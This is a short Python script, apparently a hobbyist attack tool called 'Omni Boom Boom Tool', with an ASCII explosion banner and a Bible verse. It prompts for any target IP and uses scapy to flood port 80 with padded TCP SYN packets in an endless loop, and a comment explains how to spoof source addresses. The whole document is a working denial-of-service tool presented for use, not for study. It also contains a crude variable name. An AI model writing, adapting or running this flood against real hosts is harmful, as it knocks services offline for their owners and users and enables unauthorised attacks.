from scapy.all import *
print(
"""
                               ________________
                          ____/ (  (    )   )  \___
                         /( (  (  )   _    ))  )   )\__
                     ((/  ( _(   )   (   _) ) (  () )  )
                    ( (  ( (_)   ((    (   )  .((_ ) .  )_
                   ( (  )    (      (  )    )   ) . ) (   )
                  (  (   (  (   ) (  _  ( _) ).  ) . ) ) ( )
                  ( (  (   ) (  )   (  ))     ) _)(   )  )  )
                 ( (  ( \ ) (    (_  ( ) ( )  )   ) )  )) ( )
      Omni       (  (   (  (   (_ ( ) ( _    )  ) (  )  )   )
 Boom Boom Tool  ( (  ( (  (  )     (_  )  ) )  _)   ) _( ( )
                  ((  (   )(    (     _    )   _) _(_ (  (_ )
                   (_((__(_(__(( ( ( |  ) ) ) )_))__))_)___)
                   ((__)        \\||lll|l||///          \_))
                            (   /(/ (  )  ) )\   )
                          (    ( ( ( | | ) ) )\   )
                           (   /(| / ( )) ) ) )) )
                         (     ( ((((_(|)_)))))     )
                          (      ||\(|(|)|/||     )
                        (        |(||(||)||||        )
                          (     //|/l|||)|\\ \     )
                        (/ / //  /|//||||\\  \ \  \ _)
-------------------------------------------------------------------------------
 Revelation 21:6. I am Alpha and Omega, the beginning and the end. I will give
    unto him that is athirst of the fountain of the water of life, freely.
    
"""
)
fatfuck = input(str("Enter IP To Syn Flood : "))
print("Syn Flooding The IP:",fatfuck,"With Thousands Of Syn Packets, (They Are Being Bombed)")
target_ip = fatfuck
target_port = 80

# forge IP packet with target ip as the destination IP address
ip = IP(dst=target_ip)
# or if you want to perform IP Spoofing (will work as well)
# ip = IP(src=RandIP("192.168.1.1/24"), dst=target_ip)


# forge a TCP SYN packet with a random source port
# and the target port as the destination port
tcp = TCP(sport=RandShort(), dport=target_port, flags="S")


# add some flooding data (1KB in this case)
raw = Raw(b"X"*1024)

# stack up the layers
p = ip / tcp / raw
# send the constructed packet in a loop until CTRL+C is detected 
send(p, loop=1, verbose=0)